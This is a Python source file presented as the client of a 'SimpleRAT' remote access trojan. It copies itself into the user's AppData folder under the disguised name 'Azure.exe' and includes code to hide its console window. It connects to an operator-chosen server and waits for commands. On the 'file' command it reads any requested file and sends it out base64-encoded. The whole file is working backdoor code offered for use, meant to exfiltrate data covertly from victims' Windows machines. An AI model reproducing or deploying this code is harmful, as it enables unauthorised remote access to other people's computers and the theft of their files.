# -*- coding: utf-8 -*-
# @Author : Alysif
# @Github : https://github.com/alysif/SimpleRAT
import socket
import os
import base64
import threading
import shutil
import sys
import win32gui, win32con

def CopyToAnotherSite(): # To copy this client to another site [Compile firt to a Exe with pyinstaller o py2exe]
    pathToCopy = os.environ('appdata') + "\\Azure.exe"
    if not os.path.isfile(pathToCopy):
        shutil.copyfile(sys.executable, pathToCopy)

"""
def HideConsole():
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide, win32con.SW_HIDE)
"""

def Main(host, port):
    global client
    #HideConsole()
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port)) #
    commandThread = threading.Thread(target=ThreadCommands, args=());
    commandThread.start()

def ThreadCommands():
    global client
    while True:
        # Data
        data = client.recv(1024).decode()
        if(not data): break
        # Commands
        if(data.startswith("file")):
            with open(data.split(' ')[1], 'rb') as file:
                sendFile = file.read()
                client.send(base64.b64encode(sendFile))
                file.close()
            print("File send")
        elif(data.startswith("listdir")):
            list_dir = os.listdir(os.getcwd())
            directory = ""
            for dir in list_dir:
                directory += dir+"\n"
            client.send(directory.encode())
        elif(data.startswith("exit")):
            client.close()
            break
        else:
            client.send("Ok".encode())

if __name__ == "__main__":
    Main("localhost", 9999) # Change parameters for your server connection
    print(sys.executable)